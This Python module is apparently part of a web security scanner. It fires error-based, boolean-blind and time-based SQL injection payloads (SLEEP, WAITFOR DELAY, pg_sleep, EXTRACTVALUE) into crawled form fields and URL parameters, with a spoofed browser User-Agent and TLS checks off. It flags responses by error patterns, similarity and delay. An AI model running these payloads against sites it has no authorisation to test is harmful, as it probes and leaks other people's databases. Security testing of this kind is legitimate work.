"""
SQLi Scanner - Production Grade
Techniques: Error-based, Time-based Blind, Boolean-based Blind, Union-based
Dynamic baseline averaging eliminates false positives from noisy pages.
"""
import requests, time, re, difflib
from urllib.parse import urlparse, parse_qs

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

# ── Error patterns ─────────────────────────────────────────────────────────
SQL_ERRORS = [
    re.compile(r, re.I) for r in [
        r"you have an error in your sql syntax",
        r"warning: mysql_(fetch|query|num_rows|connect)",
        r"unclosed quotation mark after the character string",
        r"quoted string not properly terminated",
        r"microsoft ole db provider for sql server",
        r"ora-[0-9]{4,5}:",
        r"sqlite[_\s]exception",
        r"pg_query\(\).*?failed",
        r"sqlstate\[",
        r"sql syntax.*?mysql",
        r"column count doesn't match value count",
        r"unknown column .+ in 'field list'",
        r"table '.+' doesn't exist",
        r"supplied argument is not a valid (mysql|pg)",
        r"incorrect syntax near",
        r"conversion failed when converting",
        r"invalid column name",
        r"\[microsoft\]\[odbc",
        r"db2 sql error",
        r"mysql_fetch_array\(\)",
    ]
]

# ── Payloads ───────────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    ("'",                           "single_quote"),
    ("''",                          "double_quote"),
    ("' OR '1'='1' --",             "or_true"),
    ("' OR 1=1 --",                 "or_one"),
    ("1' ORDER BY 1 --",            "order_1"),
    ("1' ORDER BY 999 --",          "order_999"),
    ("' UNION SELECT NULL --",      "union_null"),
    ("' UNION SELECT NULL,NULL --", "union_null2"),
    ("admin' --",                   "admin_comment"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --", "extractvalue"),
    ("' AND 1=CONVERT(int,@@version) --", "mssql_convert"),
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1",  "' AND '1'='2"),
    ("' AND 1=1 --",  "' AND 1=2 --"),
    ("1 AND 1=1",     "1 AND 1=2"),
]

TIME_PAYLOADS = [
    ("' AND SLEEP(4) --",              "mysql_sleep"),
    ("'; WAITFOR DELAY '0:0:4' --",    "mssql_delay"),
    ("' AND 1=(SELECT 1 FROM (SELECT SLEEP(4))A) --", "mysql_subquery"),
    ("'; SELECT pg_sleep(4) --",       "pgsql_sleep"),
    ("' OR SLEEP(4) --",               "mysql_or_sleep"),
]

def req(method, url, data=None, params=None, timeout=10, session_headers=None):
    try:
        t0  = time.time()
        hdrs = {**HEADERS, **(session_headers or {})}
        kw  = dict(headers=hdrs, timeout=timeout, verify=False, allow_redirects=True)
        if method == "POST":
            r = requests.post(url, data=data, **kw)
        else:
            r = requests.get(url, params=params or data, **kw)
        return r, round(time.time()-t0, 2)
    except requests.Timeout:
        return None, timeout
    except:
        return None, 0

def has_sql_error(text, baseline_text=""):
    text_l = text.lower()
    for pat in SQL_ERRORS:
        m = pat.search(text_l)
        if m:
            match_str = m.group(0)
            if match_str not in baseline_text.lower():
                return True, match_str
    return False, None

def similarity(a, b):
    return difflib.SequenceMatcher(None, a[:3000], b[:3000]).ratio()

def _dynamic_threshold(baselines):
    """
    Compute similarity thresholds from multiple baseline requests.
    This removes false positives caused by timestamps, ads, random tokens.
    Returns (true_min, false_max):
      - TRUE payload must score >= true_min vs baseline
      - FALSE payload must score <= false_max vs baseline
    """
    if len(baselines) < 2:
        return 0.85, 0.70  # fallback to old static values

    # Measure natural variation between baseline responses
    sims = []
    for i in range(len(baselines)):
        for j in range(i+1, len(baselines)):
            sims.append(similarity(baselines[i], baselines[j]))

    natural_variation = min(sims)  # worst-case similarity between baselines

    # TRUE threshold: must be at least as similar as the baselines are to each other
    # minus a small tolerance for the injection itself
    true_min = max(0.60, natural_variation - 0.05)

    # FALSE threshold: must differ more than baselines naturally vary
    false_max = max(0.30, natural_variation - 0.20)

    return true_min, false_max

def build_finding(vuln_type, url, param, payload, method, description):
    SEVERITY = {
        "SQL Injection (Error-Based)":   "Critical",
        "SQL Injection (Time-Based)":    "Critical",
        "SQL Injection (Boolean-Based)": "Critical",
        "SQL Injection (Union-Based)":   "Critical",
    }
    return {
        "vuln_type":      vuln_type,
        "url":            url,
        "parameter":      param,
        "payload":        payload,
        "severity":       SEVERITY.get(vuln_type, "Critical"),
        "description":    description,
        "recommendation": (
            "1. Use parameterised queries / prepared statements. "
            "2. Use an ORM (SQLAlchemy, Django ORM). "
            "3. Apply principle of least privilege to DB accounts. "
            "4. Enable WAF. 5. Sanitise all user input."
        )
    }

def test_sqli(method, url, base_data, param, session_headers=None):
    findings = []

    # ── Take 3 baseline samples for dynamic threshold ─────────────────────
    baselines = []
    baseline_time = []
    for _ in range(3):
        r0, t0 = req(method, url,
                     data=base_data if method=="POST" else None,
                     params=base_data if method=="GET" else None,
                     session_headers=session_headers)
        if r0:
            baselines.append(r0.text)
            baseline_time.append(t0)
        time.sleep(0.1)

    if not baselines:
        return findings

    baseline_text = baselines[0]
    avg_baseline_time = sum(baseline_time) / len(baseline_time)
    true_min, false_max = _dynamic_threshold(baselines)

    # ── 1. Error-based ─────────────────────────────────────────────────────
    for payload, ptype in ERROR_PAYLOADS:
        d = base_data.copy(); d[param] = payload
        r, _ = req(method, url,
                   data=d if method=="POST" else None,
                   params=d if method=="GET" else None,
                   session_headers=session_headers)
        if not r: continue
        vuln, pattern = has_sql_error(r.text, baseline_text)
        if vuln:
            findings.append(build_finding(
                "SQL Injection (Error-Based)", url, param, payload, method,
                f"SQL error triggered in param '{param}' ({method}). "
                f"DB error pattern: '{pattern}'. Payload: {payload}"
            ))
            return findings

    # ── 2. Boolean-based (with dynamic thresholds) ─────────────────────────
    for true_p, false_p in BOOLEAN_PAYLOADS:
        d_true  = base_data.copy(); d_true[param]  = str(base_data.get(param,"1")) + true_p
        d_false = base_data.copy(); d_false[param] = str(base_data.get(param,"1")) + false_p

        r_true,  _ = req(method, url,
                         data=d_true  if method=="POST" else None,
                         params=d_true  if method=="GET" else None,
                         session_headers=session_headers)
        r_false, _ = req(method, url,
                         data=d_false if method=="POST" else None,
                         params=d_false if method=="GET" else None,
                         session_headers=session_headers)
        if not r_true or not r_false: continue

        sim_true  = similarity(baseline_text, r_true.text)
        sim_false = similarity(baseline_text, r_false.text)

        # Use dynamic thresholds — not hardcoded 0.85/0.70
        if sim_true >= true_min and sim_false <= false_max:
            findings.append(build_finding(
                "SQL Injection (Boolean-Based)", url, param, true_p, method,
                f"Boolean-based blind SQLi in '{param}'. "
                f"TRUE similarity: {sim_true:.2f} (threshold ≥{true_min:.2f}), "
                f"FALSE similarity: {sim_false:.2f} (threshold ≤{false_max:.2f}). "
                f"Dynamic thresholds computed from {len(baselines)} baseline samples."
            ))
            return findings

    # ── 3. Time-based ──────────────────────────────────────────────────────
    for payload, ptype in TIME_PAYLOADS:
        d = base_data.copy(); d[param] = payload
        _, elapsed = req(method, url,
                         data=d if method=="POST" else None,
                         params=d if method=="GET" else None,
                         timeout=12,
                         session_headers=session_headers)
        # Must be 3+ seconds longer than average baseline
        if elapsed >= 3.5 and elapsed <= 11 and elapsed >= avg_baseline_time + 2.5:
            findings.append(build_finding(
                "SQL Injection (Time-Based)", url, param, payload, method,
                f"Time-based blind SQLi in '{param}'. "
                f"Response delayed {elapsed:.1f}s (avg baseline: {avg_baseline_time:.1f}s). "
                f"DB paused {elapsed - avg_baseline_time:.1f}s — confirms SQL injection."
            ))
            return findings
        time.sleep(0.05)

    return findings

def scan_form(form, page_url, session_headers=None):
    findings = []
    action = form.get("action") or page_url
    method = form.get("method","GET").upper()
    inputs = [i for i in form.get("inputs",[])
              if i.get("name") and i.get("type","text") not in
              ["submit","button","image","file","checkbox","radio","reset"]]
    if not inputs: return findings

    base = {i["name"]: i.get("value") or "1"
            for i in form.get("inputs",[]) if i.get("name")}

    for inp in inputs[:6]:
        for f in test_sqli(method, action, base, inp["name"], session_headers):
            findings.append(f)
            break
    return findings

def scan_url(url, session_headers=None):
    parsed = urlparse(url)
    qs = {k: v[0] for k,v in parse_qs(parsed.query).items()}
    if not qs: return []
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    findings = []
    for param in list(qs.keys())[:6]:
        for f in test_sqli("GET", base_url, qs, param, session_headers):
            findings.append(f)
            break
    return findings

def run_sqli_scan(crawl_data, session_headers=None):
    findings, seen = [], set()
    for page in crawl_data:
        for form in page.get("forms",[]):
            for f in scan_form(form, page["url"], session_headers):
                key = f"{f['url']}:{f['parameter']}"
                if key not in seen:
                    seen.add(key); findings.append(f)
        if page.get("params"):
            for f in scan_url(page["url"], session_headers):
                key = f"{page['url']}:{f['parameter']}"
                if key not in seen:
                    seen.add(key); findings.append(f)
    return findings
